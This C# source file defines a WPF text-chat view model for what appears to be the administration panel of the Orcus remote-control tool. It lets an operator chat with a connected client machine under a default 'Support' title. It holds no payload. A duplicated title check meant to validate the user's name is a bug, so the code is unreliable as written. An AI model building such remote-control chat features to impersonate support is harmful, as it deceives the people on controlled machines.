using System;
using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.TextChat;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Commands.TextChat;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class TextChatViewModel : CommandView
    {
        private ObservableCollection<ChatMessage> _chatMessages;
        private string _currentMessage;
        private bool _isBusy;
        private bool _isStarted;
        private RelayCommand _sendMessageCommand;
        private TextChatCommand _textChatCommand;

        public override string Name { get; } = (string) Application.Current.Resources["Chat"];
        public override Category Category { get; } = Category.Utilities;

        public ChatSettings ChatSettings { get; private set; }

        public ObservableCollection<ChatMessage> ChatMessages
        {
            get { return _chatMessages; }
            set { SetProperty(value, ref _chatMessages); }
        }

        public bool IsBusy
        {
            get { return _isBusy; }
            set { SetProperty(value, ref _isBusy); }
        }

        public bool IsStarted
        {
            get { return _isStarted; }
            set
            {
                if (value)
                {
                    if (string.IsNullOrWhiteSpace(ChatSettings.Title))
                    {
                        WindowService.ShowMessageBox((string) Application.Current.Resources["TitleCantBeEmpty"],
                            (string) Application.Current.Resources["Error"]);
                        return;
                    }

                    if (string.IsNullOrWhiteSpace(ChatSettings.Title))
                    {
                        WindowService.ShowMessageBox((string) Application.Current.Resources["YourNameCantBeEmpty"],
                            (string) Application.Current.Resources["Error"]);
                        return;
                    }

                    _textChatCommand.StartChat(ChatSettings);
                }
                else
                    _textChatCommand.Close();
                IsBusy = true;
            }
        }

        public string CurrentMessage
        {
            get { return _currentMessage; }
            set { SetProperty(value, ref _currentMessage); }
        }

        public RelayCommand SendMessageCommand
        {
            get
            {
                return _sendMessageCommand ?? (_sendMessageCommand = new RelayCommand(parameter =>
                {
                    if (string.IsNullOrWhiteSpace(CurrentMessage))
                        return;
                    _textChatCommand.SendMessage(CurrentMessage);
                    ChatMessages.Add(new ChatMessage
                    {
                        Content = CurrentMessage,
                        IsFromMe = true,
                        Timestamp = DateTime.Now
                    });
                    CurrentMessage = null;
                }));
            }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            _textChatCommand = clientController.Commander.GetCommand<TextChatCommand>();
            _textChatCommand.NewMessageReceived += _textChatCommand_NewMessageReceived;
            _textChatCommand.ChatStatusChanged += _textChatCommand_ChatStatusChanged;
            _textChatCommand.ChatInitalizationFailed += _textChatCommand_ChatInitalizationFailed;
            ChatSettings = new ChatSettings {Title = "Support", YourName = "Administrator"};
            ChatMessages = new ObservableCollection<ChatMessage>();
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/FeedbackBubble_16x.png", UriKind.Absolute));
        }

        private void _textChatCommand_ChatInitalizationFailed(object sender, EventArgs e)
        {
            IsBusy = false;
            _isStarted = false;
            OnPropertyChanged(nameof(IsStarted));
        }

        private void _textChatCommand_ChatStatusChanged(object sender, EventArgs e)
        {
            _isStarted = _textChatCommand.IsStarted;
            OnPropertyChanged(nameof(IsStarted));
            if (_isStarted)
                ChatMessages = new ObservableCollection<ChatMessage>();
            IsBusy = false;
        }

        private void _textChatCommand_NewMessageReceived(object sender, ChatMessage e)
        {
            ChatMessages.Add(e);
        }
    }
}